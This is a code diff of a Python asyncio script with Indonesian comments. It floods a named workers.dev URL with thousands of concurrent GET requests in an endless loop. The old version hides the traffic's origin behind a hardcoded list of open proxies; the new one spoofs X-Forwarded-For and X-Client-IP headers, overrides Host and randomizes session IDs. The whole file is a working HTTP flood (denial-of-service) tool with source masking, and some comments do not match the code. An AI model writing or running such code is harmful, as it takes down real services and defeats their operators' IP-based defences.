@@ -1,54 +1,53 @@
 import aiohttp
 import asyncio
-import random
-import time
+import uuid
 
-# Daftar proxy yang akan digunakan di seluruh eksekusi
-proxy_list = [
-    'http://23.152.40.15:3128',
-    'http://115.85.181.243:80',
-    'http://83.240.214.11:8080',
-    'http://144.49.99.216:8080',
-    'http://78.138.126.6:3128',
-    'http://65.108.104.102:8080',
-    'http://189.173.171.127:999',
-    'http://144.49.99.169:8080',
-    'http://177.71.137.117:3129',
-    'http://20.120.240.49:80',
-    'http://51.159.155.40:32013'
-]
+# Konfigurasi IP palsu
+fake_ip_range = '28.0.0.1/8'
+fake_ip_filter = ['*.lan', '*.local']
+nameserver = ['1.1.1.1']
 
-async def send_request_with_proxy(url, proxy):
+# Buat kustom header dengan alamat IP palsu dan session ID palsu
+custom_headers = {
+    'X-Forwarded-For': fake_ip_range,
+    'X-Client-IP': fake_ip_range,
+    'Host': 'sxtcp.tg-index.workers.dev',  # Ganti dengan host yang sesuai
+    'Session-ID': str(uuid.uuid4())  # Session ID palsu
+}
+
+async def send_request(url):
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, proxy=proxy) as response:
-                if response.status == 200:
-                    return 'Success'
-                else:
-                    return 'Failed'
+        async with aiohttp.ClientSession(headers=custom_headers) as session:
+            async with session.get(url) as response:
+                response_text = await response.text()
+                return response_text
     except Exception as e:
-        return 'Failed'
+        return None
 
 async def main():
     default_url = 'https://sxtcp.tg-index.workers.dev'  # URL default
-    num_requests = 5000  # Jumlah permintaan yang ingin Anda kirim
+    num_requests = 5009  # Jumlah permintaan yang ingin Anda kirim
 
     while True:
-        tasks = []
-        for _ in range(num_requests):
-            proxy = random.choice(proxy_list)
-            task = send_request_with_proxy(default_url, proxy)
-            tasks.append(task)
+        # Inisialisasi list untuk menyimpan hasil respons
+        responses = []
 
-        try:
-            responses = await asyncio.gather(*tasks)
-        except Exception as e:
-            print(f"An error occurred: {str(e)}")
-            return
+        # Buat daftar 10 tugas tambahan untuk mengirim permintaan
+        additional_tasks = [send_request(default_url) for _ in range(50)]
+        
+        # Gabungkan tugas-tugas tambahan dengan tugas sebelumnya
+        tasks = [send_request(default_url) for _ in range(num_requests)]
+        tasks += additional_tasks
 
+        # Jalankan tugas-tugas secara bersamaan
+        responses = await asyncio.gather(*tasks)
+
+        # Handle hasil respons di sini
         for response in responses:
-            print(response)
+            if response is not None:
+                print('Success')
+            else:
+                print('Failed')
 
-    
 if __name__ == "__main__":
     asyncio.run(main())
